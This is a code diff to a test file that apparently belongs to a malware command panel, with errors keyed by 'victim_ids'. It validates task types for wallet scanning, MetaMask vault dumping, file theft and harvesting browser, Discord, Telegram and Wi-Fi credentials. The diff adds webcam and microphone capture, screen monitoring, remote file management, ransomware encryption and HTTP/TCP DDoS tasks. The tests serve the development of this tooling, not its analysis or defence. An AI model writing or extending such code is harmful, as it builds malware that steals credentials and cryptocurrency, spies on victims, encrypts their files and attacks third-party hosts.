@@ -35,7 +35,7 @@ test('unlinked wins over missing when both are present', () => {
   assert.deepEqual(error?.victim_ids, ['a', 'b']);
 });
 
-test('the eleven task types validate at the edge', () => {
+test('the seventeen task types validate at the edge', () => {
   const samples: Record<string, Record<string, unknown>> = {
     scan_wallets: {},
     dump_vault: { target: 'metamask' },
@@ -47,13 +47,31 @@ test('the eleven task types validate at the edge', () => {
     screenshot: {},
     file_pull: { path: '/tmp/a' },
     cancel: { task_id: '9b2f1a34-5c6d-4e7f-8a90-1b2c3d4e5f60' },
-    agent: { command: 'ping' }
+    agent: { command: 'ping' },
+    monitor: { seconds: 5, fps: 1, quality: 60 },
+    files: { action: 'list', path: '/tmp' },
+    webcam: {},
+    mic: { seconds: 5 },
+    ransomware: { action: 'encrypt', path: '/tmp/x' },
+    ddos: { method: 'http', host: 'example.com', port: 80 }
   };
-  assert.equal(Object.keys(samples).length, 11);
+  assert.equal(Object.keys(samples).length, 17);
   for (const [name, params] of Object.entries(samples)) {
     assert.equal(validateParams(name, params), null, name);
     assert.ok(transportOf(name) === 'http' || transportOf(name) === 'frame', name);
   }
+});
+
+test('new tasks reject wrong enums and missing required params', () => {
+  assert.equal(validateParams('harvest', { kind: 'productkey' }), null);
+  assert.equal(validateParams('harvest', { kind: 'nope' }), 'invalid_param: kind (all|browsers|discord|telegram|wifi|productkey)');
+  assert.equal(validateParams('files', { action: 'list' }), 'missing_param: path');
+  assert.equal(validateParams('files', { action: 'chmod', path: '/tmp' }), 'invalid_param: action (list|upload|mkdir|rename|delete|compress)');
+  assert.equal(validateParams('ddos', { method: 'udp', host: 'x', port: 1 }), 'invalid_param: method (http|tcp)');
+  assert.equal(validateParams('monitor', { fps: 0.1 }), 'invalid_param: fps (0.2..5)');
+  assert.equal(validateParams('ransomware', { action: 'encrypt', path: '/tmp' }), null);
+  assert.equal(transportOf('monitor'), 'http');
+  assert.equal(transportOf('webcam'), 'http');
 });
 
 test('max_bytes outside 1 MiB..512 MiB is rejected', () => {
